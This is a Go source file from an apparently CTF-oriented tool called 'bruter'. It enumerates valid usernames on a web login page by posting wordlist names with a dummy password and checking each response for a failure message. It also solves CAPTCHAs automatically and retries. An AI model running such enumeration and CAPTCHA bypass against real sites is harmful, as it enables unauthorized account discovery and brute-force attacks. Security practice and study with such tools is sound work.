package enumerator

import (
	"bruter/shared"
	"bruter/structs"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/thomas-osgood/OGOR/misc/generators"
	"github.com/thomas-osgood/OGOR/output"
)

// function designed to create and initialize a new
// enumerator object based on user configuration options.
func NewEnumerator(opts ...EnumeratorOptFunc) (enumerator *Enumerator, err error) {
	var currentOpt EnumeratorOptFunc
	var defaultPass string
	var defaults EnumeratorOpt = EnumeratorOpt{
		Client:   http.DefaultClient,
		FailMsg:  "<strong>Error:</strong> The user",
		OnlyOne:  false,
		Route:    "login",
		Scheme:   "http",
		TargetIP: "127.0.0.1",
		Wordlist: "passwords.txt",
	}

	defaults.Client.Timeout = 10 * time.Second

	defaultPass, err = generators.GenRandomName(generators.DEFAULT_RAND_MIN, generators.DEFAULT_RAND_MAX)
	if err != nil {
		defaultPass = "aaaaaaaaaa"
	}
	defaults.Password = defaultPass

	for _, currentOpt = range opts {
		err = currentOpt(&defaults)
		if err != nil {
			return nil, err
		}
	}

	enumerator = &Enumerator{}
	enumerator.client = defaults.Client
	enumerator.commschan = make(chan string)
	enumerator.failmsg = defaults.FailMsg
	enumerator.onlyOne = defaults.OnlyOne
	enumerator.Password = defaults.Password
	enumerator.Route = defaults.Route
	enumerator.Scheme = defaults.Scheme
	enumerator.TargetIP = defaults.TargetIP
	enumerator.Wordlist = defaults.Wordlist

	enumerator.printer, err = output.NewOutputter()
	if err != nil {
		return nil, err
	}

	return enumerator, nil
}

// function designed to set the HTTP client used by
// the enumerator while making requests to the target.
func WithClient(client *http.Client) EnumeratorOptFunc {
	return func(e *EnumeratorOpt) error {
		if client == nil {
			return fmt.Errorf("client must not be nil")
		}

		e.Client = client

		return nil
	}
}

// function designed to set the fail message used
// by the enumerator. this message will be used as
// an indication of an invalid username.
func WithFailMessage(msg string) EnumeratorOptFunc {
	return func(a *EnumeratorOpt) error {
		msg = strings.TrimSpace(msg)
		if len(msg) < 1 {
			return fmt.Errorf("fail message must be non-zero length string")
		}
		a.FailMsg = msg
		return nil
	}
}

// function designed to set the flag indicating whether
// to stop after the first username is discovered. if this
// is false, all usernames in the wordlist will be tested.
func FindOne(indicator bool) EnumeratorOptFunc {
	return func(e *EnumeratorOpt) error {
		e.OnlyOne = indicator
		return nil
	}
}

// function designed to set the route targeted by
// the enumerator during enumeration.
func WithRoute(route string) EnumeratorOptFunc {
	return func(a *EnumeratorOpt) error {
		a.Route = route
		return nil
	}
}

// function designed to set the HTTP scheme used
// by the enumerator during requests.
func WithScheme(scheme string) EnumeratorOptFunc {
	return func(a *EnumeratorOpt) error {
		scheme = strings.ToLower(scheme)

		if !shared.Contains(shared.ValidSchemes, scheme) {
			return fmt.Errorf("invalid scheme \"%s\"", scheme)
		}

		a.Scheme = scheme
		return nil
	}
}

// function designed to set the IP targeted by
// the enumerator.
func WithTargetIP(ip string) EnumeratorOptFunc {
	return func(a *EnumeratorOpt) error {
		a.TargetIP = ip
		return nil
	}
}

// function designed to set the username wordlist
// used by the enumerator.
func WithWordlist(wordlist string) EnumeratorOptFunc {
	return func(e *EnumeratorOpt) error {
		wordlist = strings.TrimSpace(wordlist)
		if len(wordlist) < 1 {
			return fmt.Errorf("wordlist must be a non-zero length string")
		}
		e.Wordlist = wordlist
		return nil
	}
}

// public function designed to be a top-level enumeration
// function. this will spawn workers that will attempt to
// discover usernames on the target.
func (e *Enumerator) Enumerate() (usernames []string, err error) {
	var curuser string
	var usergen *generators.WordlistGenerator

	usernames = make([]string, 0)

	usergen, err = generators.NewWordlistGenerator(e.Wordlist)
	if err != nil {
		return nil, err
	}

	usergen.CommsChan = e.commschan
	go usergen.ReadWordlist()

	for curuser = range e.commschan {

		e.printer.SysMsgNB(fmt.Sprintf("attempting \"%s:%s\"", curuser, e.Password))

		err = e.makeRequest(structs.LoginRequest{Username: curuser, Password: e.Password})
		if err == nil {
			usernames = append(usernames, curuser)
			if e.onlyOne {
				return usernames, nil
			}
		}

	}

	if len(usernames) < 1 {
		e.printer.ErrMsg("no usernames discovered")
		return nil, fmt.Errorf("no usernames discovered")
	}

	return usernames, nil
}

// private function designed to make a request to the target
// and check for a valid login.
func (e *Enumerator) makeRequest(creds structs.LoginRequest) (err error) {
	var content []byte
	var payload url.Values = make(url.Values)
	var resp *http.Response
	var tgturl string = fmt.Sprintf("%s://%s/%s", e.Scheme, e.TargetIP, e.Route)

	payload.Set("username", creds.Username)
	payload.Set("password", creds.Password)

	if creds.Captcha != 0 {
		payload.Set("captcha", fmt.Sprintf("%d", creds.Captcha))
	}

	resp, err = e.client.PostForm(tgturl, payload)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	content, err = shared.CheckResponse(resp, e.failmsg, shared.CAPTCHAMSG)
	if err != nil {
		if (creds.Captcha != 0) || os.IsTimeout(err) {
			return err
		}

		creds.Captcha, err = shared.SolveCaptcha(content)
		if err != nil {
			return err
		}

		return e.makeRequest(creds)
	}

	e.printer.SucMsg(fmt.Sprintf("possible username: %s", creds.Username))
	return nil
}
